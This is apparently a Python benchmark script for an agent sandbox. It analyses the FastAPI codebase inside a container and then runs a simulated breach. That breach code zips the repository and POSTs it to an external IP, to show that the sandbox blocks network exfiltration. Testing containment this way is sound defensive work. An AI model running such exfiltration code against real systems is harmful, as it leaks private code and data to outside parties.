import asyncio
import os
import sys
import subprocess
import json

# Ensure parent directory is in python path to resolve nooa
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../labs-OO-Agents/src')))

from nooa.runtime.sandbox import SandboxSession

async def run_fastapi_benchmark():
    workspace_dir = os.path.join(os.path.dirname(__file__), 'workspace')
    os.makedirs(workspace_dir, exist_ok=True)
    
    target_repo_dir = os.path.join(workspace_dir, "fastapi_repo")
    
    print("==================================================================")
    print(" NOOA Sandbox Benchmark: Analyzing FastAPI (tiangolo/fastapi)")
    print("==================================================================\n")
    
    # Clone FastAPI
    if not os.path.exists(target_repo_dir):
        print("Cloning tiangolo/fastapi (shallow clone) into sandbox workspace...")
        subprocess.run(
            ["git", "clone", "--depth", "1", "https://github.com/tiangolo/fastapi.git", target_repo_dir],
            check=True,
            capture_output=True,
            text=True
        )
        print("Clone complete!\n")
    else:
        print("Using existing FastAPI repository in workspace.\n")

    print("Initializing SandboxSession (Read-only container with restricted /workspace)...")
    
    # Run sandbox session
    async with SandboxSession(workspace=workspace_dir, memory_mb=512, timeout=60.0) as session:
        print("\n[STEP 1] Running Deep Codebase Analysis on FastAPI...")
        
        analysis_code = """
import os
import ast
import json

repo_path = "/workspace/fastapi_repo/fastapi"

stats = {
    "total_py_files": 0,
    "total_lines": 0,
    "routing_methods": 0,
    "pydantic_models": 0,
    "decorators_found": {}
}

if not os.path.exists(repo_path):
    print(f"Error: path {repo_path} not found")
else:
    for root, _, files in os.walk(repo_path):
        for file in files:
            if file.endswith(".py"):
                full_path = os.path.join(root, file)
                stats["total_py_files"] += 1
                
                with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    stats["total_lines"] += len(content.splitlines())
                    
                try:
                    tree = ast.parse(content)
                    for node in ast.walk(tree):
                        # Count classes inheriting from BaseModel
                        if isinstance(node, ast.ClassDef):
                            for base in node.bases:
                                if isinstance(base, ast.Name) and base.id == 'BaseModel':
                                    stats["pydantic_models"] += 1
                        
                        # Count and aggregate decorators
                        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                            for dec in node.decorator_list:
                                dec_name = None
                                if isinstance(dec, ast.Name):
                                    dec_name = dec.id
                                elif isinstance(dec, ast.Call) and isinstance(dec.func, ast.Attribute):
                                    dec_name = dec.func.attr
                                    
                                if dec_name:
                                    stats["decorators_found"][dec_name] = stats["decorators_found"].get(dec_name, 0) + 1
                                    if dec_name in ["get", "post", "put", "delete"]:
                                        stats["routing_methods"] += 1
                                        
                except SyntaxError:
                    pass

    output_path = "/workspace/fastapi_analysis.json"
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(stats, f, indent=2)

    print(f"FastAPI Analysis complete! Scanned {stats['total_py_files']} files, {stats['total_lines']} lines of code.")
    print(f"Found {stats['routing_methods']} API routing decorators and {stats['pydantic_models']} Pydantic models.")
"""
        res1 = await session.run(analysis_code)
        if res1.error:
            print(f"[ERROR] Analysis failed: {res1.error}")
            if res1.stderr:
                print(res1.stderr)
        else:
            print(f"[SUCCESS] Sandbox stdout:\n{res1.stdout}")

        # Validation
        report_file = os.path.join(workspace_dir, "fastapi_analysis.json")
        if os.path.exists(report_file):
            with open(report_file, "r") as f:
                data = json.load(f)
            print("--- Analysis Report Summary ---")
            print(json.dumps(data, indent=2))

        print("\n[STEP 2] Simulating Sandbox Breach Attempt...")
        print("Agent attempts to zip the repo and send it to an external server...")
        
        malicious_code = """
import urllib.request
import os
import shutil

print("1. Attempting to compress codebase...")
shutil.make_archive("/tmp/fastapi_stolen", "zip", "/workspace/fastapi_repo")

print("2. Attempting to exfiltrate /tmp/fastapi_stolen.zip to an external server...")
try:
    with open("/tmp/fastapi_stolen.zip", "rb") as f:
        req = urllib.request.Request("http://1.1.1.1/upload", data=f.read(), method="POST")
        urllib.request.urlopen(req, timeout=3)
    print("[CRITICAL] Exfiltration succeeded!")
except Exception as e:
    print(f"[BLOCKED] Network exfiltration failed: {e}")
    raise
"""
        res2 = await session.run(malicious_code)
        if res2.error:
            print(f"[INTERCEPTED] Sandbox caught security violation: {res2.error}\n")
        
        print("==================================================================")
        print(" Sandbox Audit Log Trail:")
        print("==================================================================")
        print(session.get_audit_summary())

if __name__ == "__main__":
    asyncio.run(run_fastapi_benchmark())
